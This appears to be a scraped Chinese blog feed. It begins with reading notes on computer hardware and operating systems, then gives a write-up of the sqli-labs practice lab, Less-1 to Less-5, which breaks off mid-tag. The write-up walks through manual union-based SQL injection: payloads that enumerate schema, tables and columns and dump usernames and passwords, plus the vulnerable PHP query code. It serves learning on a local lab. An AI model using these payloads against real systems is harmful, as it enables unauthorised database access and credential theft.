早期的计算机没有很复杂的图形功能，CPU的核心频率也不高，跟内存的频率一样，它们都是直接连接在同一个总线（Bus）上的。为了协调I/O设备与总线之间的速度，也为了能够让CPU能够和I/O设备进行通信，一般每个设备都会有一个相应的I/O控制器。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.6kie90plsps0.webp"></p><p>​                                        （图1-1 早期的计算机硬件结构 ）</p><p><strong>2.北桥与南桥芯片</strong>：为了协调CPU、内存和高速的图形设备，人们专门设计了一个高速的北桥芯片（Northbridge，PCI Bridge），以便它们之间能够高速地交换数据。由于北桥运行的速度非常高，所有相对低速的设备如果全都直接连接在北桥上，北桥既须处理高速设备，又须处理低速设备，设计就会十分复杂。于是人们又设计了专门处理低速设备的南桥（Southbridge）芯片，磁盘、USB、键盘、鼠标等设备都连接在南桥上，由南桥将它们汇总后连接到北桥上。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.580j3n7mklfk.webp"></p><p><strong>3.SMP与多核</strong>：</p><ul><li><strong>对称多处理器（SMP，Symmetrical Multi Processing）</strong>，简单地讲就是每个CPU在系统中所处的地位和所发挥的功能都是一样的，是相互对称的。</li><li>理论上讲，增加CPU的数量就可以提高运算速度，并且理想情况下，速度的提高与CPU的数量成正比。但实际上并非如此，因为我们的程序并不是都能分解成若干个完全不相干的子问题。</li><li>多核处理器<strong>（Multi-core Processor）</strong>实际上就是SMP的简化版，当然它们在细节上还有一些差别，只是多核和SMP在缓存共享等方面有细微的差别，使得程序在优化上可以有针对性地处理。</li></ul><p><strong>4.系统软件</strong>：</p><ul><li>传统意义上一般将用于管理计算机本身的软件称为系统软件，以区别普通的应用程序。</li><li>一类是平台性的，比如操作系统内核、驱动程序、运行库和数以千计的系统工具。</li><li>另外一类是用于程序开发的，比如编译器、汇编器、链接器等开发工具和开发库。</li><li>计算机系统软件体系结构采用一种层的结构。</li><li>Linux使用0x80号中断作为系统调用接口。</li></ul><p><strong>5.操作系统</strong>：</p><ul><li><p>操作系统的一个功能是提供抽象的接口，另外一个主要功能是管理硬件资源。</p></li><li><p>多道程序（Multiprogramming）</p></li><li><p>分时系统（Time-Sharing System）</p></li><li><p><strong>多任务（Multi-tasking）系统</strong>：</p></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3mfrj89mh1mo.webp"></p><ul><li>驱动程序可以看作是操作系统的一部分，它往往跟操作系统内核一起运行在特权级，但它又与操作系统内核之间有一定的独立性，使得驱动程序有比较好的灵活性。</li></ul><p><strong>6.一次读取文件例子的分析：</strong></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.5bths8zui874.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.7elw6au6z4zk.webp"></p><p>7.一些名词：</p><ul><li><p>分段（Segmentation）</p></li><li><p>分页（Paging）</p></li></ul><hr><p>P34 2023年1月11日</p><hr>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab(手工注入篇)</title>
      <link href="/2022/10/08/sqli-lab%E7%AC%AC%E4%B8%80%E5%85%B3/"/>
      <url>/2022/10/08/sqli-lab%E7%AC%AC%E4%B8%80%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>狠狠地给我注入💉</p></blockquote><span id="more"></span><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><blockquote><p>GET - Error based - Single quotes - String</p></blockquote><h2 id="一、题目环境"><a href="#一、题目环境" class="headerlink" title="一、题目环境"></a>一、题目环境</h2><p>打开靶场Level1如图所示：<br><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA1.png"></p><h2 id="二、判断是否存在SQL注入"><a href="#二、判断是否存在SQL注入" class="headerlink" title="二、判断是否存在SQL注入"></a>二、判断是否存在SQL注入</h2><blockquote><p>Please input the ID as parameter with numeric value.</p></blockquote><p>由题目的提醒，我们试着输入手动输入id来观察页面是否有回显来判断是否存在SQL注入漏洞。</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA2.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA3.png"></p><p>通过输入不同的id值，我们发现页面有了回显并且返回的内容也不相同，这说明存在我们刚才输入的内容是代入数据库中去执行查询命令了。即此页面存在SQL注入漏洞。</p><h2 id="三、判断类型"><a href="#三、判断类型" class="headerlink" title="三、判断类型"></a>三、判断类型</h2><ul><li>根据参数类型：字符型，数字型、搜索型</li><li>根据提交方式：POST注入，GET注入，HTTP HEAD注入</li><li>根据有无回显：联合注入，报错注入，布尔盲注，延时注入</li><li>其他注入：堆叠注入，宽字节注入，二次注入等</li></ul><p>在这里由于是level1且初学，我们仅考虑参数类型中的字符型和数字型。</p><h3 id="1-判断漏洞类型是否是数字型"><a href="#1-判断漏洞类型是否是数字型" class="headerlink" title="1.判断漏洞类型是否是数字型"></a>1.判断漏洞类型是否是数字型</h3><blockquote><p>当输入的参数为整型时，SQL语句类型大致如下：<br>select * from &lt;表名&gt; where id = x<br>这种类型可以使用 <strong>and 1=1</strong> 和 <strong>and 1=2</strong> 来进行判断：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 页面依旧运行正常，继续进行下一步。</span><br><span class="line"></span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 页面运行错误，则说明此<span class="keyword">SQL</span>注入为数字型注入。若页面依旧运行正常，则漏洞类型不是数字型</span><br><span class="line"></span><br><span class="line">在后台执行的<span class="keyword">SQL</span>语句大致如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA4.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA5.png"></p><p>根据回显可得，该SQL注入漏洞不是数字型。</p><h3 id="2-判断漏洞类型是否是字符型"><a href="#2-判断漏洞类型是否是字符型" class="headerlink" title="2.判断漏洞类型是否是字符型"></a>2.判断漏洞类型是否是字符型</h3><blockquote><p>当输入的参数为字符型时，SQL 语句类型大致如下：<br>select * from &lt;表名&gt; where id = ‘x’<br>这种类型我们同样可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> 页面运行正常，继续进行下一步。</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span> 页面运行错误，则说明此 <span class="keyword">Sql</span> 注入为字符型注入。</span><br><span class="line"></span><br><span class="line">可以简化成：</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and 1=1 --+页面运行正常，继续进行下一步。</span></span><br><span class="line"><span class="string">url/?id= x&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ 页面运行错误，则说明此 Sql 注入为字符型注入。</span></span><br><span class="line">在后台执行的<span class="keyword">SQL</span>语句大致如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA7.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA8.png"></p><p>根据回显可得, 该SQL注入漏洞是字符型.</p><h2 id="四、开始注入"><a href="#四、开始注入" class="headerlink" title="四、开始注入"></a>四、开始注入</h2><p>由于靶场不支持#号的注释方法,我们采用–+的注释方法.</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA6.png"></p><h3 id="1-获取表格有几列"><a href="#1-获取表格有几列" class="headerlink" title="1.获取表格有几列"></a>1.获取表格有几列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure><p>这个只有从1~n挨个去试,有时候运气好可能试的次数少一点.</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA9.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA10.png"></p><p>所以,这个表格由三列组成.</p><blockquote><p><strong>order by语法：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 数字 <span class="operator">|</span> 列名 [ <span class="keyword">ASC</span> , [ <span class="keyword">DESC</span> ] ]</span><br></pre></td></tr></table></figure><p>1、order by：对查询结果按照指定列进行排序，指定列的方式有两种：数字或列名</p><p>2、ASC：升序排列，默认为ASC</p><p>3、DESC：降序排列</p><p> 注意：<strong>以数字方式指定排序列时，数字不能超过列的总数</strong>，利用该特性在进行SQL注入的时候可以判断数据库的字段数量</p></blockquote><h3 id="2-爆出显示位"><a href="#2-爆出显示位" class="headerlink" title="2.爆出显示位"></a>2.爆出显示位</h3><blockquote><p>显示位就是网页中能够显示数据的位置。</p><p>举例来说，比如我们通过order by命令知道了表的列数为11。然后再使用union select 1,2,3…,11 from table，网页中显示了信息8，那么说明网页只能够显示第8列中信息，不能显示其他列的信息。也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。所以如果我们想要知道某个属性的值，比如admin,就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><blockquote><p><strong>为什么这里要给id赋值为-1呢?</strong></p><p>如果id=1的数据被查询出来，返回到页面中，就占据了两个回显位,导致后续的查询的内容无法回显到页面中,所以就是专门不让id正确从而能够让后续查询语句能够正常回显.</p></blockquote><h3 id="3-爆出库名和版本或操作系统和用户名"><a href="#3-爆出库名和版本或操作系统和用户名" class="headerlink" title="3.爆出库名和版本或操作系统和用户名"></a>3.爆出库名和版本或操作系统和用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,database(),version()--+</span></span><br><span class="line"><span class="string">url/?id=-1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,@<span class="variable">@version</span>_compile_os,<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA11.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.1n2ch975ei80.webp"></p><blockquote><p>database(),version()都是sql中的函数.</p><p>这里将2,3换为database()和version()是因为2,3才是显示位.</p></blockquote><h3 id="4-爆出表名"><a href="#4-爆出表名" class="headerlink" title="4.爆出表名"></a>4.爆出表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.b0j47d12sjk.webp"></p><p><strong>1.group_concat函数</strong></p><p> ​    group_concat函数是将查询到的每行结果以某个字段名进行合并，每一行合并的结果以逗号分隔开，如果逗号看不清楚的话，可以自定义分隔符如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name,&#x27;我是分隔符&#x27;)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.27orjr0g48ow.webp"></p><p> <strong>2.information_schema数据库</strong></p><p> ​    information_schema是mysql自带的一个信息数据库，保存着关于MySQL服务器所维护的所有其他数据库的信息。在information_schema数据库中还可以利用的表如下：</p><table><thead><tr><th align="center">schema_name</th><th align="center">储存了所有数据库的库名</th></tr></thead><tbody><tr><td align="center"><strong>table_schema</strong></td><td align="center"><strong>储存了数据库名</strong></td></tr><tr><td align="center"><strong>tables</strong></td><td align="center"><strong>储存了数据库库名，以及该库中包含的表名</strong></td></tr><tr><td align="center"><strong>table_name</strong></td><td align="center"><strong>储存了表名</strong></td></tr></tbody></table><h3 id="5-爆出字段内容"><a href="#5-爆出字段内容" class="headerlink" title="5.爆出字段内容"></a>5.爆出字段内容</h3><blockquote><p>由于在爆表时候我们发现了关键表‘users’，于是我们现在去查一查它其中的字段</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3qemwe8cioxs.webp"></p><p>发现了关键字段，现在我们来爆出字段的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span><span class="comment">--&#x27;),group_concat(password,&#x27;--&#x27;) from users--+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.537toufrxm9s.webp"></p><p>成功获取关键数据。</p><h2 id="五、后记"><a href="#五、后记" class="headerlink" title="五、后记"></a>五、后记</h2><p>​    这道题虽然不难但是花了我挺多的时间，很大部分是我对数据库太不熟悉了：表、行、列、字段之间的关系等等，下面放一些资料吧：</p><ol><li><a class="link" href="https://blog.csdn.net/m0_63550462/article/details/121206926?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%92%8C%E5%88%97&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121206926.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">表、列、行、注解等讲解<i class="fas fa-external-link-alt"></i></a></li><li>数据库字段是是什么？每个字段由若干按照某种界限划分的相同数据类型的数据项组成.通常在表中为“列”</li><li><a class="link" href="https://blog.csdn.net/qq_44159028/article/details/114325805?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167339772016800217031196%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167339772016800217031196&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-114325805-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">SQL注入详解<i class="fas fa-external-link-alt"></i></a></li></ol><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><blockquote><p>GET - Error based - Intiger based</p></blockquote><p>​    同Less-1,只不过是数字型SQL注入，少了引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 </span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()</span><br><span class="line">--+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;</span><br><span class="line">--+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(username,&quot;--&quot;),group_concat(password,&quot;--&quot;) from users</span><br><span class="line">--+</span><br></pre></td></tr></table></figure><p><strong>小Tips</strong>：可以在本地用navicat连接好我们要查询的数据库，然后觉得抽象的部分就拿着本地的数据库中的结构去写SQL语句。</p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><blockquote><p>GET - Error based - Single quotes with twist –string</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------判断为字符型注入--------------------</span><br></pre></td></tr></table></figure><p>继续注入我们发现，Less-1的方法会报错，查看php源码发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>由于将注入的部分用了括号整体括起来，我们现在要实现注入的话就得更改一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;$id&#x27;)</span><br><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&#x27;-1&#x27; union select 1,database(),version() --+&#x27;)</span><br><span class="line">//这样就会存在括号缺失，我们提前结束括号就能注入成功</span><br><span class="line">--------------------应当注入如下--------------------</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&#x27;-1&#x27;) union select 1,database(),version() --+&#x27;)</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><blockquote><p>Less-4 Error Based- DoubleQuotes String</p></blockquote><p>有点奇怪，字符型和数字型都测了一遍，但是发现页面都有正确回显。注释语句也没起到作用，看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//该代码的目的是在变量 $id 的值的前后添加双引号。</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&quot;1&#x27; union select 1,database(),version() --+&quot;)</span><br></pre></td></tr></table></figure><p><mark>存疑:</mark>为什么页面能够正确地返回id=1的信息而不报错？为什么不能执行union联合查询语句？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&quot;1&#x27;) union select 1,database(),version() --+&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload如下：在Less-3的基础上把-1后面的单引号改为双引号即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-4/</span><br><span class="line">?id=-1&quot;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>​    在实际环境下，如果需要手工注入我怎么快速地知道注入闭合条件是什么呢？</p><ul><li>脚本遍历</li><li>获取源码（感觉难度较大，都获取到源码了）</li></ul><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><ul><li><input disabled type="checkbox"> python写一个遍历的程序打通这两关</li></ul><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><blockquote><p>Less-5 Double Query- Single Quotes- String</p></blockquote><h2 id="一、分析题目"><a href="#一、分析题目" class="headerlink" title="一、分析题目"></a>一、分析题目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------确认为字符型注入--------------------</span><br></pre></td></tr></table></figure><p>有点意思，发现之前的模板语句注入后都只回显<code>You are in...........</code>，查看源码发现，只要查询结果正确就只返回<code>You are in...........</code>，应该算是盲注了？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本题：</span></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//之前做的题目：</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="二、盲注知识点"><a href="#二、盲注知识点" class="headerlink" title="二、盲注知识点"></a>二、盲注知识点</h2><p>盲注分类大致如此：</p><p><img lazyload alt="image" 